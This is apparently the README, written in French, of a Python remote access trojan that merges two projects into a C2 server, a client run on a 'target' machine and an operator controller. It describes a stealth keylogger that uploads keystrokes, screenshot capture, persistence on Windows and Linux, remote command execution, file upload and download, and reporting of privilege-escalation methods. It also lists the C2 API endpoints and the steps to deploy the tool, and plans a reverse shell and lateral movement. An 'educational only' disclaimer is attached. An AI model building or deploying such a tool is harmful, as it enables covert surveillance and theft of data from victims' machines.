# Basic RAT - Complete Edition (Fusionné)

## 🎯 Description

Version fusionnée complète du RAT (Remote Administration Tool) combinant toutes les fonctionnalités de deux projets:
- **basic-rat-main**: Process Management + File Management  
- **basic-rat-System-Control-and-Data-Operations**: Keylogger + Screenshots + System Info détaillé

## 🚀 Fonctionnalités

### ⚙️ Gestion des Processus
- Liste tous les processus
- Arbre des processus
- Détails d'un processus par PID
- Tuer un processus
- Démarrer un processus
- Exécuter des commandes

### 📁 Gestion des Fichiers
- Navigation dans les répertoires
- Liste des fichiers avec permissions, tailles, dates
- Recherche de fichiers par pattern
- Téléchargement de fichiers (par chunks)
- Upload de fichiers (par chunks)  
- Compression de fichiers (ZIP)
- Suppression de fichiers/dossiers
- Création de répertoires

### ⌨️ Keylogger
- Enregistrement des frappes clavier
- Mode stealth
- Détection de la fenêtre active
- Stockage local et upload au serveur
- Rotation automatique des logs
- Support Windows et Linux

### 📸 Screenshots
- Capture d'écran unique
- Multi-display support
- Qualité personnalisable
- Compression automatique
- Sauvegarde locale

### 🖥️ Informations Système Détaillées
- **OS**: Nom, version, build, activation, dernière mise à jour
- **Architecture**: CPU (model, cores, fréquence), RAM, stockage
- **User**: Username, privilèges, groupes, domaine
- **Privilèges**: UAC, capacités, méthodes d'escalation
- **Network**: IP, gateway, DNS, connexions actives, ports

### 🔐 Sécurité
- Communication chiffrée (XOR + Base64)
- Identifiants clients persistants (hardware-based)
- Persistence Windows & Linux
- Heartbeat automatique
- Nettoyage automatique des données

## 📦 Installation

### Serveur (C2)
```bash
pip install -r requirements.txt
python server.py
```

### Client (Target)
```bash
pip install -r requirements.txt
python client.py
```

### Controller (Admin)
```bash
pip install -r requirements.txt
python controller.py
```

## 🔧 Configuration

Modifier `config.py`:
```python
HOST = "https://votre-serveur-c2.com"
ENCRYPTION_KEY = "votre_cle_secrete"
CHUNK_SIZE = 8192
```

## 📖 Utilisation

### 1. Démarrer le serveur C2
```bash
python server.py
```

### 2. Démarrer le client sur la machine cible
```bash
python client.py
```

### 3. Utiliser le controller pour administrer
```bash
python controller.py
```

Menu principal:
```
1. Refresh client list        - Actualiser la liste
2. Server status              - Statut du serveur
3. Manage client processes    - Gestion complète
4. File manager               - Gestionnaire de fichiers
5. Exit                       - Quitter
```

Menu Process Management (option 3):
```
1. List all processes         - Liste tous les processus
2. Process tree               - Arbre des processus
3. Process details by PID     - Détails par PID
4. Kill process               - Tuer un processus
5. Start process              - Démarrer un processus
6. Execute command            - Exécuter une commande
7. System info                - Info système basique
8. Keylogger Management       - ⌨️ Gestion keylogger
9. Screenshot Management      - 📸 Screenshots
10. Detailed System Info      - 🖥️ Info détaillées
11. Back to main menu         - Retour
```

## 🏗️ Architecture

```
basic-rat-merged/
├── client.py                 # Client RAT (target)
├── server.py                 # Serveur C2
├── controller.py             # Interface admin
├── config.py                 # Configuration
├── encryptor.py              # Chiffrement
├── protocol.py               # Protocole de communication
├── client_identity_manager.py # Gestion ID clients
├── persistence.py            # Persistence manager
├── process_manager.py        # Gestion processus
├── file_manager.py           # Gestion fichiers
├── keylogger.py              # Keylogger
├── screenshotManager.py      # Screenshots
├── commandExecutor.py        # Exécution commandes
├── System_info.py            # Info système
├── Architecture_info.py      # Info architecture
├── Network_info.py           # Info réseau
├── Os_info.py                # Info OS
├── Privileges_info.py        # Info privilèges
├── User_info.py              # Info utilisateur
├── windows_pers.py           # Persistence Windows
├── windows_proc.py           # Process Windows
├── linux_pers.py             # Persistence Linux
└── linux_proc.py             # Process Linux
```

## 🔒 Endpoints API (Serveur)

### Client Endpoints
- `POST /register` - Enregistrement client
- `POST /heartbeat` - Heartbeat
- `POST /commands` - Récupération commandes
- `POST /commands_result` - Soumission résultats
- `POST /keylog_data` - Upload keylogs

### Admin Endpoints
- `GET /admin/clients` - Liste clients
- `GET /admin/status` - Statut serveur
- `POST /admin/process/<client_id>` - Commande process
- `POST /admin/file/<client_id>` - Commande file
- `GET /admin/command_result/<command_id>` - Récupération résultat
- `GET /admin/keylogs/<client_id>` - Récupération keylogs
- `GET /admin/keylogs_stats` - Statistiques keylogs

## ⚠️ Avertissement

Ce projet est à des fins éducatives uniquement. L'utilisation de ce logiciel sans autorisation explicite est illégale. Les auteurs ne sont pas responsables de toute utilisation abusive.

## 📝 Licence

Ce projet est fourni "tel quel" sans garantie d'aucune sorte.

## 🔄 Version

Version Fusionnée Complète - Janvier 2026
Combine basic-rat-main + basic-rat-System-Control-and-Data-Operations

## 🛠️ Support

Plateformes supportées:
- Windows 10/11
- Linux (Ubuntu, Debian, etc.)

Python: 3.8+

## 📋 TODO / Améliorations futures

- [ ] Interface web pour le controller
- [ ] Chiffrement AES au lieu de XOR
- [ ] Authentification multi-facteurs
- [ ] Support macOS
- [ ] Capture audio
- [ ] Webcam capture
- [ ] Reverse shell
- [ ] SOCKS proxy
- [ ] Lateral movement

---

**⚠️ USAGE LÉGAL UNIQUEMENT - ÉDUCATIF SEULEMENT ⚠️**
